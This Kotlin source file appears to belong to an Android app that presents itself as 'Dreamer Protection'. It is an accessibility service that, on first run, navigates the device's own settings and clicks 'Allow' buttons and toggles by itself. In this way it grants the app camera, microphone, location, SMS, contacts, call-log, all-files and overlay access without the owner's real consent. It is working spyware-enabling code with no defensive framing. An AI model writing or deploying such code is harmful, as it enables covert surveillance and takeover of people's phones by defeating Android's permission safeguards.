package com.h4k3r.dreamer

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.ComponentName
import android.content.pm.ActivityInfo
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast
import kotlinx.coroutines.*

class DreamerAccessibilityService : AccessibilityService() {
    companion object {
        private const val TAG = "DreamerAccessibility"
        var instance: DreamerAccessibilityService? = null
    }

    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private var isGrantingPermissions = false
    private val pendingPermissions = mutableSetOf<String>()

    override fun onCreate() {
        super.onCreate()
        instance = this
        Log.d(TAG, "Accessibility service created")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()

        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 100
        }

        serviceInfo = info

        Toast.makeText(this, "✅ Dreamer Protection Active", Toast.LENGTH_SHORT).show()
        Log.d(TAG, "Accessibility service connected and configured")

        // Auto-grant all permissions on first run
        scope.launch {
            delay(2000) // Wait for system to stabilize
            autoGrantAllPermissions()
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (!isGrantingPermissions) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                handleWindowChange(event)
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                if (event.packageName == "com.android.packageinstaller" ||
                    event.packageName == "com.google.android.permissioncontroller" ||
                    event.packageName == "com.android.permissioncontroller") {
                    handlePermissionDialog()
                }
            }
        }
    }

    private fun handleWindowChange(event: AccessibilityEvent) {
        val className = event.className?.toString() ?: return

        Log.d(TAG, "Window changed: $className")

        // Handle permission dialogs
        if (className.contains("GrantPermissionsActivity") ||
            className.contains("PermissionActivity") ||
            event.packageName?.toString()?.contains("permissioncontroller") == true) {

            scope.launch {
                delay(500) // Wait for UI to load
                handlePermissionDialog()
            }
        }
    }

    private fun handlePermissionDialog() {
        val rootNode = rootInActiveWindow ?: return

        Log.d(TAG, "Checking for permission dialog...")

        // Look for "Allow" buttons in multiple languages
        val allowTexts = listOf(
            "Allow", "ALLOW", "allow",
            "Accept", "ACCEPT", "accept",
            "Grant", "GRANT", "grant",
            "Yes", "YES", "yes",
            "OK", "Ok", "ok",
            "While using the app",
            "Only this time",
            "Always",
            "允许", "确定", // Chinese
            "허용", "확인", // Korean
            "Permitir", "Aceptar", // Spanish
            "Autoriser", "Accepter", // French
            "अनुमति दें", "स्वीकार करें" // Hindi
        )

        // First try to find and click any "Don't ask again" checkbox
        findAndClickNode(rootNode, "Don't ask again", "CheckBox")

        // Then find and click allow button
        for (text in allowTexts) {
            if (findAndClickNode(rootNode, text, "Button")) {
                Log.d(TAG, "Successfully clicked: $text")
                return
            }
        }

        // If no button found, try by ID
        val possibleIds = listOf(
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_always_button",
            "android:id/button1",
            "com.google.android.permissioncontroller:id/permission_allow_button"
        )

        for (id in possibleIds) {
            if (findAndClickNodeById(rootNode, id)) {
                Log.d(TAG, "Successfully clicked button by ID: $id")
                return
            }
        }
    }

    private fun findAndClickNode(node: AccessibilityNodeInfo, text: String, className: String? = null): Boolean {
        // Check current node
        if (node.text?.toString()?.contains(text, ignoreCase = true) == true) {
            if (className == null || node.className?.toString()?.contains(className) == true) {
                if (node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    return true
                } else {
                    // Try clicking parent
                    var parent = node.parent
                    while (parent != null) {
                        if (parent.isClickable) {
                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            parent.recycle()
                            return true
                        }
                        val temp = parent
                        parent = parent.parent
                        temp.recycle()
                    }
                }
            }
        }

        // Check children
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            if (findAndClickNode(child, text, className)) {
                child.recycle()
                return true
            }
            child.recycle()
        }

        return false
    }

    private fun findAndClickNodeById(node: AccessibilityNodeInfo, id: String): Boolean {
        val foundNodes = node.findAccessibilityNodeInfosByViewId(id)
        for (foundNode in foundNodes) {
            if (foundNode.isClickable && foundNode.isEnabled) {
                foundNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                foundNode.recycle()
                return true
            }
            foundNode.recycle()
        }
        return false
    }

    fun autoGrantAllPermissions() {
        scope.launch {
            isGrantingPermissions = true
            Log.d(TAG, "Starting auto-grant process...")

            // Open app settings
            try {
                val intent = android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = android.net.Uri.parse("package:$packageName")
                    addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)

                delay(2000) // Wait for settings to open

                // Find and click "Permissions" in app info
                val rootNode = rootInActiveWindow
                if (rootNode != null) {
                    findAndClickNode(rootNode, "Permissions", null)
                    delay(1500)

                    // Click on each permission category
                    val permissionCategories = listOf(
                        "Camera", "Location", "Storage", "Files", "Contacts",
                        "SMS", "Phone", "Microphone", "Calendar", "Call logs"
                    )

                    for (category in permissionCategories) {
                        val currentRoot = rootInActiveWindow ?: continue
                        if (findAndClickNode(currentRoot, category, null)) {
                            delay(1000)
                            handlePermissionDialog()
                            delay(500)
                            // Go back
                            performGlobalAction(GLOBAL_ACTION_BACK)
                            delay(500)
                        }
                    }
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error during auto-grant", e)
            } finally {
                isGrantingPermissions = false
                // Return to home
                performGlobalAction(GLOBAL_ACTION_HOME)
            }
        }
    }

    fun grantSpecificPermission(permission: String) {
        pendingPermissions.add(permission)
        if (!isGrantingPermissions) {
            processPendingPermissions()
        }
    }

    private fun processPendingPermissions() {
        scope.launch {
            while (pendingPermissions.isNotEmpty()) {
                isGrantingPermissions = true
                val permission = pendingPermissions.first()
                pendingPermissions.remove(permission)

                Log.d(TAG, "Granting permission: $permission")

                // Map permission to UI text
                val uiText = when (permission) {
                    "camera" -> "Camera"
                    "location", "location_fine" -> "Location"
                    "storage", "storage_read", "all_files_access" -> "Files"
                    "contacts" -> "Contacts"
                    "sms" -> "SMS"
                    "phone" -> "Phone"
                    "microphone" -> "Microphone"
                    else -> permission
                }

                // Open specific permission settings
                val intent = when (permission) {
                    "all_files_access" -> {
                        if (Build.VERSION.SDK_INT >= 30) {
                            android.content.Intent(android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                                data = android.net.Uri.parse("package:$packageName")
                            }
                        } else null
                    }
                    "overlay" -> {
                        android.content.Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                            data = android.net.Uri.parse("package:$packageName")
                        }
                    }
                    else -> {
                        android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                            data = android.net.Uri.parse("package:$packageName")
                        }
                    }
                }

                if (intent != null) {
                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(intent)

                    delay(2000)

                    // For specific permission screens, just click allow
                    if (permission == "all_files_access" || permission == "overlay") {
                        handlePermissionToggle()
                    } else {
                        // Navigate to permissions and grant
                        val rootNode = rootInActiveWindow
                        if (rootNode != null && findAndClickNode(rootNode, "Permissions", null)) {
                            delay(1500)
                            val permRoot = rootInActiveWindow
                            if (permRoot != null && findAndClickNode(permRoot, uiText, null)) {
                                delay(1000)
                                handlePermissionDialog()
                            }
                        }
                    }

                    delay(500)
                    performGlobalAction(GLOBAL_ACTION_BACK)
                }
            }

            isGrantingPermissions = false
            performGlobalAction(GLOBAL_ACTION_HOME)
        }
    }

    private fun handlePermissionToggle() {
        val rootNode = rootInActiveWindow ?: return

        // Find and click any switch/toggle that is OFF
        findAndClickSwitch(rootNode, false)
    }

    private fun findAndClickSwitch(node: AccessibilityNodeInfo, targetState: Boolean): Boolean {
        // Check if this is a switch
        if (node.className?.toString()?.contains("Switch") == true) {
            val isChecked = node.isChecked
            if (isChecked != targetState) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return true
            }
        }

        // Check children
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            if (findAndClickSwitch(child, targetState)) {
                child.recycle()
                return true
            }
            child.recycle()
        }

        return false
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        scope.cancel()
    }
}